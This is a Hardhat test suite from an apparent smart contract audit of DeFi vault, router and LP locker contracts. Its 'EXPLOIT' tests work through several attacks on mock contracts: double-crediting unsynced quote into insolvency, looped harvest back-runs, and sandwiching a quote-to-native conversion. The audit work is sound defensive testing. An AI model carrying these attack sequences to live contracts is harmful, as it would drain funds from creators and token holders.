import { expect } from "chai";
import { ethers, network } from "hardhat";

// Independent audit 4: TreasuryRouterV4, CreatorRewardsVaultV2, EvmGenPoolSwap, PermanentLpLocker (E9 harvest),
// PermanentV3PositionLocker, holder RewardDistributor flow.
// "EXPLOIT:" tests pass when the bad outcome happens. "HOLDS:" tests pass when the property holds.
const E18 = 10n ** 18n;
const Q96 = 2n ** 96n;
const KEEP = 1, HOLDERS = 2, SPLIT = 3;
const DAY = 86400;

async function increase(seconds: number) {
  await network.provider.send("evm_increaseTime", [seconds]);
  await network.provider.send("evm_mine");
}

function isqrt(n: bigint): bigint {
  if (n < 2n) return n;
  let x = n;
  let y = (x + 1n) / 2n;
  while (y < x) {
    x = y;
    y = (x + n / x) / 2n;
  }
  return x;
}

// ---------------------------------------------------------------- BNB-style fixture (Topaz V2)
async function bnb() {
  const [admin, operator, creator, trader, other] = await ethers.getSigners();
  const weth = await (await ethers.getContractFactory("MockWETH9")).deploy();
  const topazFactory = await (await ethers.getContractFactory("MockTopazFactory")).deploy();
  const Receiver = await ethers.getContractFactory("TreasuryRouterV3ReceiverMock");
  const weekly = await Receiver.deploy();
  const monthly = await Receiver.deploy();
  const recruiter = await Receiver.deploy();
  const protocol = await Receiver.deploy();
  const community = await (await ethers.getContractFactory("CommunityRewardsVaultV3Mock")).deploy();
  const router = await (await ethers.getContractFactory("TreasuryRouterV4")).deploy(admin.address, await weekly.getAddress(), await monthly.getAddress(), 3600);
  const Vault = await ethers.getContractFactory("CreatorRewardsVaultV2");
  const vault = await Vault.deploy(admin.address, await router.getAddress(), await weth.getAddress(), 1, await topazFactory.getAddress(), DAY);
  await router.setRecruiterRewardsVault(await recruiter.getAddress());
  await router.setCommunityRewardsVault(await community.getAddress());
  await router.setProtocolRevenueVault(await protocol.getAddress());
  await router.setCreatorRewardsVault(await vault.getAddress());
  const locker = await (await ethers.getContractFactory("PermanentLpLocker")).deploy(admin.address);
  await locker.configureRevenue(await router.getAddress(), await topazFactory.getAddress());
  await router.setAuthorizedLpLocker(await locker.getAddress(), true);
  const factory = await (await ethers.getContractFactory("MockFactoryEvmGen")).deploy(await locker.getAddress());
  await vault.setFactoryOnce(await factory.getAddress());
  const distributor = await (await ethers.getContractFactory("RewardDistributor")).deploy(admin.address);
  await distributor.setBatchOperator(await vault.getAddress());
  await vault.setHolderDistributorOnce(await distributor.getAddress());
  await vault.setOperator(operator.address, false);
  await vault.setCaps(E18, 3n * E18, 3600, 50, 10n * E18);

  async function campaignWith(choice: number, pct = 0) {
    const campaign = await (await ethers.getContractFactory("MockCampaignEvmGen")).deploy(await router.getAddress(), 100n * E18);
    await factory.addCampaign(await campaign.getAddress());
    await factory.choose(await vault.getAddress(), await campaign.getAddress(), creator.address, choice, pct);
    const token = await ethers.getContractAt("MockLaunchTokenEvmGen", await campaign.token());
    return { campaign, token, c: await campaign.getAddress() };
  }
  async function graduate(campaign: any, token: any, paired: any) {
    await campaign.graduate();
    await campaign.mintTo(admin.address, 2_000_000n * E18);
    const pair = await (await ethers.getContractFactory("MockTopazPairEvmGen")).deploy();
    await topazFactory.setPool(await token.getAddress(), await paired.getAddress(), false, await pair.getAddress());
    await token.approve(await pair.getAddress(), ethers.MaxUint256);
    await paired.approve(await pair.getAddress(), ethers.MaxUint256);
    const memeIs0 = (await pair.token0()).toLowerCase() === (await token.getAddress()).toLowerCase();
    await pair.seed(memeIs0 ? 1_000_000n * E18 : 100n * E18, memeIs0 ? 100n * E18 : 1_000_000n * E18);
    await pair.mint(await locker.getAddress(), E18);
    const c = await campaign.getAddress();
    await locker.registerGraduatedPool(c, c, await vault.getAddress(), await pair.getAddress(), await token.getAddress(), await paired.getAddress(), E18);
    async function fundFees(memeFee: bigint, pairedFee: bigint) {
      await pair.fundFees(await locker.getAddress(), memeIs0 ? memeFee : pairedFee, memeIs0 ? pairedFee : memeFee);
    }
    return { pair, fundFees };
  }
  return { admin, operator, creator, trader, other, weth, topazFactory, router, Vault, vault, locker, factory, distributor, recruiter, protocol, campaignWith, graduate };
}

describe("audit4: TreasuryRouterV4 <-> CreatorRewardsVaultV2 binding", function () {
  it("HOLDS (was EXPLOIT): the router's creatorRewardsVault cannot be migrated, nor the vault's router re-pointed, so no admin action freezes existing campaigns", async function () {
    const f = await bnb();
    const k = await f.campaignWith(KEEP);
    const h = await f.campaignWith(HOLDERS);
    await k.campaign.connect(f.trader).payFee(1, { value: E18 });
    await h.campaign.connect(f.trader).payFee(1, { value: E18 });
    // The attack step: a routine admin migration to a fresh vault (e.g. for a future generation).
    const vaultB = await f.Vault.deploy(f.admin.address, await f.router.getAddress(), await f.weth.getAddress(), 1, await f.topazFactory.getAddress(), DAY);
    // Fix: the rotation path is gone. No propose/accept exists, a raw call with the old selectors reverts,
    // and the direct setter is set-once.
    expect(f.router.interface.getFunction("proposeCreatorRewardsVault")).to.equal(null);
    expect(f.router.interface.getFunction("acceptCreatorRewardsVault")).to.equal(null);
    const rotate = new ethers.Interface(["function proposeCreatorRewardsVault(address)", "function acceptCreatorRewardsVault()"]);
    await expect(f.admin.sendTransaction({ to: await f.router.getAddress(), data: rotate.encodeFunctionData("proposeCreatorRewardsVault", [await vaultB.getAddress()]) })).to.be.reverted;
    await increase(3600);
    await expect(f.admin.sendTransaction({ to: await f.router.getAddress(), data: rotate.encodeFunctionData("acceptCreatorRewardsVault", []) })).to.be.reverted;
    await expect(f.router.setCreatorRewardsVault(await vaultB.getAddress())).to.be.revertedWith("already set");
    expect(await f.router.creatorRewardsVault()).to.equal(await f.vault.getAddress());
    // Existing campaigns keep trading and accruing on their vault.
    const before = await f.vault.creatorBalance(k.c);
    await k.campaign.connect(f.trader).payFee(1, { value: E18 });
    await h.campaign.connect(f.trader).payFee(0, { value: E18 });
    expect((await f.vault.creatorBalance(k.c)) - before).to.equal((E18 * 560n) / 10000n);
    // Vault side: re-pointing the vault's router is impossible (router is immutable, no setter).
    expect(f.vault.interface.getFunction("setRouter")).to.equal(null);
    const setRouter = new ethers.Interface(["function setRouter(address)"]);
    await expect(f.admin.sendTransaction({ to: await f.vault.getAddress(), data: setRouter.encodeFunctionData("setRouter", [f.other.address]) })).to.be.reverted;
    expect(await f.vault.router()).to.equal(await f.router.getAddress());
    await k.campaign.connect(f.trader).payFee(1, { value: E18 });
  });

  it("HOLDS: a non-campaign cannot route a trade fee; profile never changes the creator share nor pays a trader", async function () {
    const f = await bnb();
    await expect(f.router.connect(f.trader).routeTrade(0, { value: E18 })).to.be.revertedWithCustomError(f.vault, "ChoiceUnset");
    const { campaign, c } = await f.campaignWith(KEEP);
    const fee = 1_000_000_007n;
    for (const p of [0, 1, 2]) {
      const before = await f.vault.creatorBalance(c);
      const recBefore = await ethers.provider.getBalance(await f.recruiter.getAddress());
      const trBefore = await ethers.provider.getBalance(f.trader.address);
      const tx = await campaign.connect(f.trader).payFee(p, { value: fee });
      const rc = await tx.wait();
      const gas = rc!.gasUsed * rc!.gasPrice;
      expect((await f.vault.creatorBalance(c)) - before).to.equal((fee * 560n) / 10000n);
      expect(trBefore - (await ethers.provider.getBalance(f.trader.address))).to.equal(fee + gas); // trader receives nothing
      const recDelta = (await ethers.provider.getBalance(await f.recruiter.getAddress())) - recBefore;
      expect(recDelta).to.equal(p === 1 ? 0n : (fee * (p === 0 ? 1250n : 1500n)) / 10000n);
    }
    await expect(f.router.routeTrade(3, { value: 1n })).to.be.revertedWith("bad profile");
  });
});

describe("audit4: CreatorRewardsVaultV2 quote excess (pullLockerPending / attributeExcessQuote / rescue)", function () {
  it("EXPLOIT: 'excess' includes another campaign's harvested-but-unsynced LP quote; attributing or rescuing it leaves quote liabilities above assets", async function () {
    const f = await bnb();
    const quote = await (await ethers.getContractFactory("MockERC20")).deploy("Quote", "USDX", 10n ** 30n, f.admin.address);
    const A = await f.campaignWith(SPLIT, 50);
    const B = await f.campaignWith(HOLDERS);
    const gA = await f.graduate(A.campaign, A.token, quote);
    const gB = await f.graduate(B.campaign, B.token, quote);
    await f.vault.syncLpFees(await gA.pair.getAddress()); // bind both pools and the quote (delta 0)
    await f.vault.syncLpFees(await gB.pair.getAddress());

    // A's pool is harvested (permissionless): 8 USDX land in the vault, not yet synced.
    await gA.fundFees(0n, 10n * E18);
    await f.locker.harvest(await gA.pair.getAddress());
    const q = await quote.getAddress();
    expect(await quote.balanceOf(await f.vault.getAddress())).to.equal(8n * E18);
    expect(await f.vault.quoteLiabilities(q)).to.equal(0n);

    // Admin "attributes excess" to B (as it would after a pullLockerPending for B) -- the check allows it.
    await f.vault.attributeExcessQuote(B.c, 8n * E18);
    expect(await f.vault.holderQuoteBalance(B.c)).to.equal(8n * E18);
    // Now anyone syncs A: A is credited the same 8 USDX again.
    await f.vault.syncLpFees(await gA.pair.getAddress());
    const liab = await f.vault.quoteLiabilities(q);
    const bal = await quote.balanceOf(await f.vault.getAddress());
    expect(liab).to.equal(16n * E18);
    expect(bal).to.equal(8n * E18);
    expect(liab).to.be.gt(bal); // insolvent in USDX

    // Variant: rescueExcessToken takes unsynced LP quote the same way.
    const f2 = await bnb();
    const quote2 = await (await ethers.getContractFactory("MockERC20")).deploy("Quote", "USDX", 10n ** 30n, f2.admin.address);
    const S = await f2.campaignWith(SPLIT, 50);
    const gS = await f2.graduate(S.campaign, S.token, quote2);
    await f2.vault.syncLpFees(await gS.pair.getAddress());
    await gS.fundFees(0n, 10n * E18);
    await f2.locker.harvest(await gS.pair.getAddress());
    await f2.vault.rescueExcessToken(await quote2.getAddress(), f2.other.address, 8n * E18);
    await f2.vault.syncLpFees(await gS.pair.getAddress());
    expect(await f2.vault.creatorQuoteBalance(S.c)).to.equal(4n * E18);
    await expect(f2.vault.connect(f2.creator).claimCreatorQuote(S.c)).to.be.reverted; // nothing left to pay the creator
  });

  it("HOLDS: native side -- rescueExcessNative can never touch accrued or unsynced (WBNB) value", async function () {
    const f = await bnb();
    const { campaign, token, c } = await f.campaignWith(HOLDERS);
    await campaign.connect(f.trader).payFee(1, { value: 10n * E18 });
    await f.weth.deposit({ value: 300n * E18 });
    const g = await f.graduate(campaign, token, f.weth);
    await g.fundFees(0n, 10n * E18);
    await f.locker.harvest(await g.pair.getAddress());
    await expect(f.vault.rescueExcessNative(f.other.address, 1n)).to.be.revertedWithCustomError(f.vault, "Insufficient");
    await expect(f.vault.rescueExcessToken(await f.weth.getAddress(), f.other.address, 1n)).to.be.revertedWithCustomError(f.vault, "Blocked");
    await f.vault.syncLpFees(await g.pair.getAddress());
    expect(await f.vault.holderBalance(c)).to.equal((10n * E18 * 560n) / 10000n + 8n * E18);
    expect(await ethers.provider.getBalance(await f.vault.getAddress())).to.equal(await f.vault.totalLiabilities());
  });
});

describe("audit4: holder batches", function () {
  it("EXPLOIT (low): a vetoed batch still consumes the weekly holder cap, so a bad proposal blocks honest batches for the week", async function () {
    const f = await bnb();
    const { campaign, c } = await f.campaignWith(HOLDERS);
    await campaign.connect(f.trader).payFee(1, { value: 400n * E18 }); // 22.4 native to holders
    const id1 = ethers.id("bad");
    await f.vault.connect(f.operator).proposeHolderBatch(id1, ethers.id("root"), 0, [c], [10n * E18]);
    await f.vault.vetoHolderBatch(id1);
    expect(await f.vault.holderBalance(c)).to.equal((400n * E18 * 560n) / 10000n);
    await expect(f.vault.connect(f.operator).proposeHolderBatch(ethers.id("good"), ethers.id("root2"), 0, [c], [E18])).to.be.revertedWithCustomError(f.vault, "CapExceeded");
  });

  it("HOLDS: the operator cannot pay a batch before the veto window, nor twice, nor beyond the Safe's authorization", async function () {
    const f = await bnb();
    const { campaign, c } = await f.campaignWith(HOLDERS);
    await campaign.connect(f.trader).payFee(1, { value: 100n * E18 });
    const id = ethers.id("w1");
    await f.vault.connect(f.operator).proposeHolderBatch(id, ethers.id("root"), 0, [c], [5n * E18]);
    await expect(f.vault.connect(f.operator).executeHolderBatch(id)).to.be.revertedWithCustomError(f.vault, "TooSoon");
    await increase(DAY);
    // No Safe authorization on the distributor: reverts, money stays in the vault and is vetoable.
    await expect(f.vault.connect(f.operator).executeHolderBatch(id)).to.be.reverted;
    const now = (await ethers.provider.getBlock("latest"))!.timestamp;
    await f.distributor.authorizeBatch(id, 5n * E18, now - 10, now + DAY);
    await f.vault.connect(f.operator).executeHolderBatch(id);
    await expect(f.vault.connect(f.operator).executeHolderBatch(id)).to.be.revertedWithCustomError(f.vault, "BadBatch");
    await expect(f.vault.vetoHolderBatch(id)).to.be.revertedWithCustomError(f.vault, "BadBatch");
    expect(await ethers.provider.getBalance(await f.vault.getAddress())).to.equal(await f.vault.totalLiabilities());
  });
});

// ---------------------------------------------------------------- E9 harvest: looping the bound
async function lockerV2() {
  const [owner, creator, recipient] = await ethers.getSigners();
  const Token = await ethers.getContractFactory("MockERC20");
  const meme = await Token.deploy("Meme", "MEME", 10n ** 30n, owner.address);
  const paired = await Token.deploy("Wrapped BNB", "WBNB", 10n ** 30n, owner.address);
  const topazFactory = await (await ethers.getContractFactory("MockTopazFactory")).deploy();
  const pair = await (await ethers.getContractFactory("MockTopazPairEvmGen")).deploy();
  await topazFactory.setPool(await meme.getAddress(), await paired.getAddress(), false, await pair.getAddress());
  const Receiver = await ethers.getContractFactory("TreasuryRouterV3ReceiverMock");
  const weekly = await Receiver.deploy();
  const protocolVault = await Receiver.deploy();
  const router = await (await ethers.getContractFactory("TreasuryRouterV4")).deploy(owner.address, await weekly.getAddress(), await weekly.getAddress(), 3600);
  await router.setProtocolRevenueVault(await protocolVault.getAddress());
  const locker = await (await ethers.getContractFactory("PermanentLpLocker")).deploy(owner.address);
  await locker.configureRevenue(await router.getAddress(), await topazFactory.getAddress());
  await router.setAuthorizedLpLocker(await locker.getAddress(), true);
  await meme.approve(await pair.getAddress(), ethers.MaxUint256);
  await paired.approve(await pair.getAddress(), ethers.MaxUint256);
  const memeIs0 = (await pair.token0()).toLowerCase() === (await meme.getAddress()).toLowerCase();
  const RM = 1_000_000n * E18, RP = 1_000n * E18;
  await pair.seed(memeIs0 ? RM : RP, memeIs0 ? RP : RM);
  await pair.mint(await locker.getAddress(), 10n * E18);
  await locker.registerGraduatedPool(creator.address, creator.address, recipient.address, await pair.getAddress(), await meme.getAddress(), await paired.getAddress(), 10n * E18);
  const attacker = await (await ethers.getContractFactory("Audit4Attacker")).deploy();
  await paired.transfer(await attacker.getAddress(), 10_000n * E18);
  async function reserves() {
    const [r0, r1] = await pair.getReserves();
    return memeIs0 ? { m: r0, p: r1 } : { m: r1, p: r0 };
  }
  async function fundMemeFees(amount: bigint) {
    await pair.fundFees(await locker.getAddress(), memeIs0 ? amount : 0n, memeIs0 ? 0n : amount);
  }
  // Back-run: buy MEME with paired until the price is back at p0 (= RP/RM); returns profit valued at p0.
  async function backrunProfit() {
    const r = await reserves();
    const target = isqrt((r.m * r.p * RM) / RP); // MEME reserve at price p0 for the current k
    if (target >= r.m) return { profit: 0n, memeOut: 0n, spend: 0n };
    const memeOut = r.m - target;
    let lo = 0n, hi = 10_000n * E18;
    const p = await paired.getAddress();
    while (lo < hi) {
      const mid = (lo + hi) / 2n;
      if ((await pair.getAmountOut(mid, p)) >= memeOut) hi = mid;
      else lo = mid + 1n;
    }
    const got = await pair.getAmountOut(lo, p);
    await attacker.v2SwapIn(await pair.getAddress(), p, lo);
    return { profit: (got * RP) / RM - lo, memeOut: got, spend: lo };
  }
  return { owner, meme, paired, pair, locker, attacker, reserves, fundMemeFees, backrunProfit, RM, RP };
}

describe("audit4: E9 harvest MEME sale bound is per call, not per block", function () {
  it("HOLDS: one harvest followed by a back-run is unprofitable (the documented property)", async function () {
    const f = await lockerV2();
    await f.fundMemeFees(30_000n * E18); // 3% of the MEME reserve accrued since the last harvest
    await f.attacker.loopHarvest(await f.locker.getAddress(), await f.pair.getAddress(), 1);
    const r = await f.backrunProfit();
    expect(r.profit).to.be.lt(0n);
  });

  it("EXPLOIT: looping the permissionless harvest in one tx dumps all carried MEME at compounding impact; a single back-run profits", async function () {
    const f = await lockerV2();
    await f.fundMemeFees(30_000n * E18);
    const pool = await f.pair.getAddress();
    await f.attacker.loopHarvest(await f.locker.getAddress(), pool, 13);
    expect(await f.locker.carriedMeme(pool)).to.equal(0n); // 3% of reserve sold in ONE transaction
    const recv = await f.paired.balanceOf((await ethers.getSigners())[2].address);
    const fair = (30_000n * E18 * f.RP) / f.RM; // value of the sold MEME at the pre-harvest price
    const r = await f.backrunProfit();
    console.log(
      `      loop x13: MEME sold 30000 (3% of reserve); creator got ${ethers.formatEther(recv)} (fair 80% = ${ethers.formatEther((fair * 8000n) / 10000n)}); attacker profit ${ethers.formatEther(r.profit)} WBNB`,
    );
    expect(r.profit).to.be.gt(0n);
  });
});

// ---------------------------------------------------------------- Robinhood-style fixture (Uniswap V3)
async function rh(routeFee: number, holderQuote: bigint = 10_000n * E18) {
  const [admin, operator, creator, trader] = await ethers.getSigners();
  await network.provider.send("hardhat_setBalance", [admin.address, "0x" + (10n ** 26n).toString(16)]);
  const weth = await (await ethers.getContractFactory("MockWETH9")).deploy();
  await weth.deposit({ value: 100_000n * E18 });
  const v3f = await (await ethers.getContractFactory("MockUniswapV3FactoryEvmGen")).deploy();
  const npm = await (await ethers.getContractFactory("MockUniswapV3PositionManagerEvmGen")).deploy();
  const integration = await (await ethers.getContractFactory("MockV3IntegrationEvmGen")).deploy(await v3f.getAddress(), await npm.getAddress(), await weth.getAddress());
  const Receiver = await ethers.getContractFactory("TreasuryRouterV3ReceiverMock");
  const r = await Receiver.deploy();
  const community = await (await ethers.getContractFactory("CommunityRewardsVaultV3Mock")).deploy();
  const router = await (await ethers.getContractFactory("TreasuryRouterV4")).deploy(admin.address, await r.getAddress(), await r.getAddress(), 3600);
  const vault = await (await ethers.getContractFactory("CreatorRewardsVaultV2")).deploy(admin.address, await router.getAddress(), await weth.getAddress(), 2, await v3f.getAddress(), DAY);
  await router.setRecruiterRewardsVault(await r.getAddress());
  await router.setCommunityRewardsVault(await community.getAddress());
  await router.setProtocolRevenueVault(await r.getAddress());
  await router.setCreatorRewardsVault(await vault.getAddress());
  const locker = await (await ethers.getContractFactory("PermanentV3PositionLocker")).deploy(admin.address);
  await locker.configureRevenue(await router.getAddress(), await integration.getAddress());
  await router.setAuthorizedLpLocker(await locker.getAddress(), true);
  const factory = await (await ethers.getContractFactory("MockFactoryEvmGen")).deploy(await locker.getAddress());
  await vault.setFactoryOnce(await factory.getAddress());
  await vault.setOperator(operator.address, false);
  await vault.setCaps(E18, 3n * E18, 3600, 50, 10n * E18);
  const stock = await (await ethers.getContractFactory("MockERC20")).deploy("Stock", "STK", 10n ** 32n, admin.address);

  async function makePool(a: any, b: any, fee: number, aRes: bigint, bRes: bigint) {
    const pool = await (await ethers.getContractFactory("MockUniswapV3PoolEvmGen")).deploy(await a.getAddress(), await b.getAddress(), fee);
    await v3f.setPool(await a.getAddress(), await b.getAddress(), fee, await pool.getAddress());
    const aIs0 = (await pool.token0()).toLowerCase() === (await a.getAddress()).toLowerCase();
    const [r0, r1] = aIs0 ? [aRes, bRes] : [bRes, aRes];
    await pool.setup(await npm.getAddress(), isqrt((r1 * Q96 * Q96) / r0), isqrt(r0 * r1));
    await a.transfer(await pool.getAddress(), aRes * 2n);
    await b.transfer(await pool.getAddress(), bRes * 2n);
    return pool;
  }
  // A stock-bound holders coin, graduated and bound (sync binds the quote).
  const campaign = await (await ethers.getContractFactory("MockCampaignEvmGen")).deploy(await router.getAddress(), 100n * E18);
  await factory.addCampaign(await campaign.getAddress());
  await factory.choose(await vault.getAddress(), await campaign.getAddress(), creator.address, HOLDERS, 0);
  const token = await ethers.getContractAt("MockLaunchTokenEvmGen", await campaign.token());
  await campaign.graduate();
  await campaign.mintTo(admin.address, 3_000_000n * E18);
  const coinPool = await makePool(token, stock, 3000, 1_000_000n * E18, 1_000n * E18);
  const id = await npm.nextId();
  await npm.mintPosition(await integration.getAddress(), await coinPool.getAddress());
  await integration.deliver(await locker.getAddress(), id);
  const c = await campaign.getAddress();
  await locker.registerGraduatedPool(c, c, await vault.getAddress(), await coinPool.getAddress(), await token.getAddress(), await stock.getAddress(), 0n);
  await vault.syncLpFees(await coinPool.getAddress());
  // Canonical WETH/stock route (the admin picks the fee tier; RH mainnet routes use 500 and 100 for SPY/NVDA...).
  const route = await makePool(stock, weth, routeFee, 1_000_000n * E18, 1_000n * E18);
  await vault.setQuoteRoute(await stock.getAddress(), routeFee);
  // 10,000 STK of holder quote (as LP fees; attributed here for brevity).
  await stock.transfer(await vault.getAddress(), holderQuote);
  await vault.attributeExcessQuote(c, holderQuote);
  const attacker = await (await ethers.getContractFactory("Audit4Attacker")).deploy();
  await stock.transfer(await attacker.getAddress(), 1_000_000n * E18);
  await weth.transfer(await attacker.getAddress(), 1_000n * E18);
  const stockIs0 = (await route.token0()).toLowerCase() === (await stock.getAddress()).toLowerCase();
  return { admin, operator, vault, weth, stock, route, attacker, c, stockIs0 };
}

async function sandwichConvert(routeFee: number, frontRun: bigint) {
  const f = await rh(routeFee);
  // Baseline: native out for the same conversion with no attacker.
  const snap = await network.provider.send("evm_snapshot", []);
  await f.vault.connect(f.operator).convertHolderQuote(f.c, 10_000n * E18);
  const baseOut = await f.vault.holderBalance(f.c);
  const baseSpent = 10_000n * E18 - (await f.vault.holderQuoteBalance(f.c));
  await network.provider.send("evm_revert", [snap]);

  const a = await f.attacker.getAddress();
  const s0 = await f.stock.balanceOf(a);
  const w0 = await f.weth.balanceOf(a);
  await f.attacker.v3SwapIn(await f.route.getAddress(), f.stockIs0, frontRun); // sell STK first
  await f.vault.connect(f.operator).convertHolderQuote(f.c, 10_000n * E18); // observe() has no history -> TWAP guard skipped
  const got = (await f.weth.balanceOf(a)) - w0;
  await f.attacker.v3SwapIn(await f.route.getAddress(), !f.stockIs0, got); // buy STK back with all WETH gained
  const profit = (await f.stock.balanceOf(a)) - s0;
  const out = await f.vault.holderBalance(f.c);
  const spent = 10_000n * E18 - (await f.vault.holderQuoteBalance(f.c));
  return { profit, baseOut, baseSpent, out, spent };
}

describe("audit4: vault quote->native conversion on a V3 route pool", function () {
  it("EXPLOIT: on a 0.05% route pool whose oracle has no 30-min history, convertHolderQuote is sandwiched at a profit", async function () {
    for (const fr of [50_000n * E18, 200_000n * E18]) {
      const r = await sandwichConvert(500, fr);
      const baseRate = (r.baseOut * 10n ** 12n) / r.baseSpent;
      const rate = (r.out * 10n ** 12n) / r.spent;
      console.log(
        `      fee 500, front-run ${fr / E18} STK: attacker +${ethers.formatEther(r.profit)} STK; vault got ${ethers.formatEther(r.out)} WETH for ${ethers.formatEther(r.spent)} STK (no attack: ${ethers.formatEther(r.baseOut)} for ${ethers.formatEther(r.baseSpent)})`,
      );
      expect(r.profit).to.be.gt(0n);
      expect(rate).to.be.lt(baseRate);
    }
  });

  it("HOLDS: the same sandwich on a 0.30% route pool loses the attacker money", async function () {
    for (const fr of [50_000n * E18, 200_000n * E18]) {
      const r = await sandwichConvert(3000, fr);
      expect(r.profit).to.be.lt(0n);
    }
  });

  it("EXPLOIT: convertHolderQuote has no interval -- the operator can repeat it in one block, so 0.5% per call compounds", async function () {
    const f = await rh(500, 100_000n * E18);
    const sp0 = await f.route.sqrtPriceX96();
    for (let i = 0; i < 8; i++) await f.vault.connect(f.operator).convertHolderQuote(f.c, await f.vault.holderQuoteBalance(f.c));
    const sp1 = await f.route.sqrtPriceX96();
    // price of STK in WETH moved by more than 3% (8 x ~0.5%) with no TWAP to stop it
    const ratio = f.stockIs0 ? (sp1 * sp1 * 10000n) / (sp0 * sp0) : (sp0 * sp0 * 10000n) / (sp1 * sp1);
    expect(ratio).to.be.lt(9700n);
  });
});
